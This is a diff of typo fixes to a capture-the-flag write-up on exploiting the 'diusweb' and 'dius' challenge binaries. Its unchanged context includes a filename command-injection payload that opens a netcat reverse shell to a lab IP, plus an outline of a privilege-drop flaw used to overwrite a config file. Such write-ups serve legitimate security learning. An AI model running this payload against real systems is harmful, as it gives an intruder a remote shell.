@@ -13,7 +13,7 @@ The challenge files provide us with two main binaries: `diusweb` and `dius`. Add
 
 I didn't spend a ton of time reversing or understanding the `diusweb` binary, as it is only a small part of this challenge. This binary powers the web interface that was the only publicly exposed part of this challenge, and serves as our initial access vector.
 
-The fundamental flaw in the `diusweb` binary is that, in order to compress user-uploaded files, it uses `system` to call the `dius` binary . However, it uses the unchanged user-specified filename when building the `dius` command that gets passed to `system`, so command injection is trivial. One of the provided hints let us know that `nc` is installed on the target, so we can pop a reverse shell with:
+The fundamental flaw in the `diusweb` binary is that, in order to compress user-uploaded files, it uses `system` to call the `dius` binary. However, it uses the unchanged user-specified filename when building the `dius` command that gets passed to `system`, so command injection is trivial. One of the provided hints let us know that `nc` is installed on the target, so we can pop a reverse shell with:
 
 ```sh
 ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.254.20 5555 >/tmp/f;
@@ -96,7 +96,7 @@ In this section, we'll take a look at Ghidra's decompilation of some of the vuln
 When interpreting the metadata file, there are two points when privileges can be dropped:
 
 * At the very beginning of execution, if either of the metadata keys `CREATE:` or `WEB:` are not in the metadata file.
-* In the web-file-creation execution path, if privileges were not dropped in the previous check. However, this only occurs *after* the file descriptor to the output file has been opened. If we could `open` a privileged file before privileges are dropped in this scenario, then the program could still write to that file descrtiptor even after dropping privileges.
+* In the web-file-creation execution path, if privileges were not dropped in the previous check. However, this only occurs *after* the file descriptor to the output file has been opened. If we could `open` a privileged file before privileges are dropped in this scenario, then the program could still write to that file descriptor even after dropping privileges.
 
 Knowing all of this, our goal becomes more clear: somehow, we need to avoid the first potential privilege drop, but still specify a non-web file path for writing. This would allow us to overwrite the `/etc/diusweb.cfg` configuration file with a disabled `DROP_PRIVILEGES` value.
 
